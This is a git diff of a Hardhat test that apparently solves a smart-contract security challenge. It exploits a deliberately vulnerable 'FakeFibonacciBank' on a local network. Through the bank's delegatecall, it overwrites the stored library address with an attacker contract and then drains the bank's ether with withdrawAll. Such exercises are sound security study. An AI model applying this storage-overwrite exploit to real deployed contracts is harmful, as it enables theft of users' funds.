@@ -4,6 +4,7 @@ const hre = require('hardhat');
 
 describe.only("Fake Fibonacci", function () {
   it("test", async function () {
+    // init
     const provider = hre.network.provider;
     const [signer] = await hre.ethers.getSigners();
 
@@ -11,33 +12,48 @@ describe.only("Fake Fibonacci", function () {
     const ffLib = await ffLibFactory.deploy();
     await ffLib.deployed();
 
+    console.log('ffLib address:', ffLib.address);
+
     const ffFactory = await ethers.getContractFactory("FakeFibonacciBank");
     const ff = await ffFactory.deploy(ffLib.address, { value: ethers.utils.parseEther('1')});
     await ff.deployed();
 
-    console.log('ffLib deploy tx', (await ffLib.deployTransaction.wait()).gasUsed);
-    console.log('ff deploy tx', (await ff.deployTransaction.wait()).gasUsed);
+    console.log('ff address:', ff.address);
+    console.log('ff balance:', ethers.BigNumber.from(await provider.send('eth_getBalance', [ff.address])).toString());
 
-    console.log('ff address', ff.address);
-    console.log('ff balance', ethers.BigNumber.from(await provider.send('eth_getBalance', [ff.address])).toString());
+    // attack
+    console.log('fakeFibonacciLibrary:', await ff.fakeFibonacciLibrary());
+    console.log('calculatedFibNumber:', await ff.calculatedFibNumber());
+    console.log('start:', await ff.start());
+    console.log('withdrawalCounter:', await ff.withdrawalCounter());
 
-    // const withdrawTx = await ff.withdraw();
-    // await withdrawTx.wait();
+    const ffLibAttackFactory = await ethers.getContractFactory("FakeFibonacciLibAttack");
+    const ffLibAttack = await ffLibAttackFactory.deploy();
+    await ffLibAttack.deployed();
 
-    console.log('fakeFibonacciLibrary', await ff.fakeFibonacciLibrary());
-    console.log('calculatedFibNumber', await ff.calculatedFibNumber());
-    console.log('start', await ff.start());
-    console.log('withdrawalCounter', await ff.withdrawalCounter());
-    // console.log('FIBSIG', await ff.FIBSIG()); // need to make it public variable to print this
+    // change ffLib address
+    console.log('ffLibAttack.address:', ffLibAttack.address);
+    const attackDelegateCallData = ffLib.interface.encodeFunctionData('setStart', [ffLibAttack.address]);
+    console.log('attackDelegateCallData:', attackDelegateCallData);
 
     await signer.sendTransaction({
       to: ff.address,
       from: signer.address,
-      data: '0xfdb5a03e',
-      // value: ethers.utils.parseEther('0.1')
+      data: attackDelegateCallData,
     });
 
-    console.log('start', await ff.start());
-    console.log('fakeFibonacciLibrary', await ff.fakeFibonacciLibrary());
+    console.log('start:', await ff.start());
+    console.log('fakeFibonacciLibrary:', await ff.fakeFibonacciLibrary());
+
+    const withdrawAllData = ffLibAttack.interface.encodeFunctionData('withdrawAll', []);
+    console.log('withdrawAllData:', withdrawAllData);
+
+    await signer.sendTransaction({
+      to: ff.address,
+      from: signer.address,
+      data: withdrawAllData,
+    });
+
+    console.log('ff balance:', ethers.BigNumber.from(await provider.send('eth_getBalance', [ff.address])).toString());
   });
 });
